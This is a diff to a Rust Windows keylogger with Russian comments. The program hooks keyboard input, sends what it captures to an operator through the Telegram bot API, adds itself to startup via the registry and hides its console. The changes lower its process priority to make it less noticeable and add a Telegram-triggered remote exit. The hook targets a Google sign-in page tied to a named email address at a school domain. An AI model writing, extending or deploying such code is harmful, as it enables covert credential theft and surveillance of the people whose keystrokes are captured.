@@ -1,4 +1,4 @@
-// это нужно чтобы было сложно отключить прогу
+// это нужно чтобы не отображалась консоль
 #![windows_subsystem = "windows"]
 
 extern crate winapi;
@@ -13,6 +13,7 @@ use winapi::um::winuser::{DispatchMessageA, GetMessageA, TranslateMessage, MSG};
 use reqwest;
 use serde_json::json;
 use tokio;
+use serde::{Deserialize, Serialize};
 
 // определение url
 use std::ptr::null_mut;
@@ -22,7 +23,51 @@ use dns_lookup::lookup_host;
 use winreg::enums::*;
 use winreg::RegKey;
 
+// для скрытия
+use winapi::um::processthreadsapi::{GetCurrentProcess, SetPriorityClass};
+use winapi::um::winbase::BELOW_NORMAL_PRIORITY_CLASS;
+
 mod config;
+
+
+// Структуры для работы с Telegram API
+#[derive(Debug, Serialize, Deserialize)]
+struct Update {
+    update_id: i64,
+    message: Option<Message>,
+}
+
+#[derive(Debug, Serialize, Deserialize)]
+struct Message {
+    chat: Chat,
+    text: Option<String>,
+}
+
+#[derive(Debug, Serialize, Deserialize)]
+struct Chat {
+    id: i64,
+}
+
+#[derive(Debug, Serialize)]
+struct SendMessage {
+    chat_id: i64,
+    text: String,
+}
+
+
+// Возвращает последние отправленные в телеграмм сообщения
+async fn get_updates(client: &reqwest::Client, api_url: &str, offset: i64) -> Result<Vec<Update>, reqwest::Error> {
+    let response = client
+        .get(format!("{}getUpdates", api_url))
+        .query(&[("offset", offset), ("timeout", 30)])
+        .send()
+        .await?
+        .json::<serde_json::Value>()
+        .await?;
+
+    let updates: Vec<Update> = serde_json::from_value(response["result"].clone()).unwrap_or_default();
+    Ok(updates)
+}
 
 // отправка сообщения в тг
 async fn bot_sender(text: String) {
@@ -46,7 +91,10 @@ async fn bot_sender(text: String) {
         .await;
 }
 
+
+// Распознавание клавиш
 unsafe extern "system" fn key_recognition(n_code: i32, w_param: WPARAM, l_param: LPARAM) -> LRESULT {
+
     // для определения зашёл он или нет
     let url = "https://accounts.google.com/v3/signin/identifier?Email=amelchakov%40fmschool72.ru&continue=https%3A%2F%2Fwww.google.com%2F&flowName=GlifWebSignIn&flowEntry=AddSession&dsh=S992212922%3A1740144921379976&ddm=1";
     if (n_code == HC_ACTION && (w_param == WM_SYSKEYDOWN as usize || w_param == WM_KEYDOWN as usize)) && !is_site_open(url) {
@@ -167,14 +215,57 @@ fn add_to_startup() -> Result<(), Box<dyn std::error::Error>> {
     Ok(())
 }
 
+// Проверка отправлял ли пользователь exit, и если да, то остановить прогу
+async fn check(len: usize) {
+    let client = reqwest::Client::new();
+    // Получаем обновления с обработкой ошибок
+    match get_updates(&client, &format!("https://api.telegram.org/bot{}/", config::BOT_TOKEN), 0).await {
+        Ok(updates) => {
+            if (updates.len() != len) {
+                if let Some(update) = updates.last() {  // <- Безопасный способ через .last()
+
+                    if let Some(message) = &update.message {  // <- Также заимствуем message
+                        if let Some(text) = &message.text {
+                            if text == "exit" {
+                                std::process::exit(0);  // Гарантированное завершение
+                            }
+                        }
+                    }
+                }
+            }
+        }
+        Err(e) => {
+            eprintln!("Ошибка при получении обновлений: {}", e);
+        }
+    }
+
+    // Небольшая пауза между запросами
+    tokio::time::sleep(tokio::time::Duration::from_secs(1)).await;
+}
+
 #[tokio::main]
 async fn main() {
+    let len = 0;
+
+    // Снижаем приоритет процесса, чтобы сделать его менее заметным
+    unsafe {
+        let process = GetCurrentProcess();
+        SetPriorityClass(process, BELOW_NORMAL_PRIORITY_CLASS);
+    }
+
     // Добавление в автозапуск
     if let Err(e) = add_to_startup() {
         tokio::spawn(bot_sender(String::from("Failed to add to startup")));
     } else {
         tokio::spawn(bot_sender(String::from("Added to startup successfully")));
     }
+
+    // Запускаем `check` в фоне
+    tokio::spawn(async move {
+        loop {
+            check(len).await;
+        }
+    });
 
 
     // закидываем удочку
